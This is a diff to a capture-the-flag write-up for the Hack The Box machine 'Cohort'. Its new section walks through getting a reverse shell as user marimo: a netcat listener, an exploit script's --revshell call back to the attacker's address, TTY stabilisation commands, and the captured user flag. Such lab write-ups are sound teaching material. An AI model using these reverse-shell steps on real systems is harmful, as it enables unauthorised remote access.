@@ -2155,39 +2155,98 @@ marimo@cohort:~$
 
 **Next:**  
 Command execution is established but not interactive. Start a listener and use the exploit's reverse-shell mode to obtain a persistent interactive shell as `marimo`.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+#### 3.14 — Obtain an interactive reverse shell and capture the user flag
+
+**Why this step:**  
+Command execution is confirmed but each invocation runs a single command and closes (3.13). Establish a persistent interactive shell for enumeration, then read the user flag.
+
+**Command:**
+
+bash
+
+```bash
+# Terminal 1 — listener on the attacking host:
+nc -lvnp 4444
+```
+
+bash
+
+```bash
+# Terminal 2 — trigger the reverse shell:
+python3 shell.py https://nb-1be3782a8afd3ad5.cohort.htb --revshell 10.10.15.77 4444
+```
+
+bash
+
+```bash
+# In the caught shell — stabilise the TTY:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl-Z to background
+stty raw -echo; fg
+# press Enter, then:
+export TERM=xterm
+
+# Capture the flag:
+id
+cat /home/marimo/user.txt
+```
+
+**Breakdown:**
+
+|Component|Purpose|
+|---|---|
+|`nc -lvnp 4444`|Listener. `-l` listen, `-v` verbose (prints the inbound connection), `-n` no DNS resolution, `-p 4444` port.|
+|`--revshell 10.10.15.77 4444`|Builds a Python reverse-shell payload connecting back to the `tun0` address (2.6) and spawning a PTY, backgrounded with `nohup` so it outlives the WebSocket connection.|
+|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Upgrades the shell to a PTY, enabling job control and programs that require a terminal.|
+|`stty raw -echo; fg`|Puts the local terminal in raw mode so keystrokes pass through untranslated, then foregrounds the listener. This is what makes Ctrl-C, arrow keys, and tab completion behave in the remote shell.|
+|`export TERM=xterm`|Sets a terminal type so full-screen programs render correctly.|
+
+**Result:**
 
 ```
-┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
-└─$ nc -lvnp 4444
 listening on [any] 4444 ...
-connect to [10.10.15.77] from (UNKNOWN) [10.129.121.70] 37362
-marimo@cohort:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'              
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-marimo@cohort:~$ ^Z
-zsh: suspended  nc -lvnp 4444
-                                                                                                                                                           
-┌──(nedmoeca㉿kali)-[~/Labs/HTB/SN11/Cohort]
-└─$ stty raw -echo; fg
-[1]  + continued  nc -lvnp 4444
-
-marimo@cohort:~$ export TERM=xterm
-marimo@cohort:~$ is
-Command 'is' not found, but can be installed with:
-apt install ironseed
-Please ask your administrator.
+connect to [10.10.15.77] from (UNKNOWN) [TARGET_IP] 37362
 marimo@cohort:~$ id
 uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
-marimo@cohort:~$ ls /home
-marimo
 marimo@cohort:~$ pwd
 /home/marimo
 marimo@cohort:~$ ls
 notebooks  user.txt
-marimo@cohort:~$ cat user.txt 
+marimo@cohort:~$ cat user.txt
 52aa58a6a2556cc193fc04e0d1db8660
-marimo@cohort:~$ 
+```
+
+---
+
+#### 🚩 USER FLAG
 
 ```
+52aa58a6a2556cc193fc04e0d1db8660
+```
+
+Captured as `marimo` (uid=1000) at `/home/marimo/user.txt`.
+
+---
+
+**What this gives you:**
+
+**Key findings:**
+
+- **Interactive foothold established** as `marimo`, a standard unprivileged user (uid 1000, single group, no supplementary groups of note).
+- **A `notebooks` directory** sits in the home directory alongside the flag — Marimo's working data, worth inspecting during enumeration.
+- The reverse shell connected from `TARGET_IP`, confirming outbound connectivity from the target to the attacker on port 4444.
+
+**Next:**  
+This completes initial access. With a stable shell as `marimo`, begin privilege-escalation enumeration: user context, sudo rights, SUID binaries, running processes, and scheduled tasks, to identify a path to root.
 <div align="center">
 <br>
 <br>
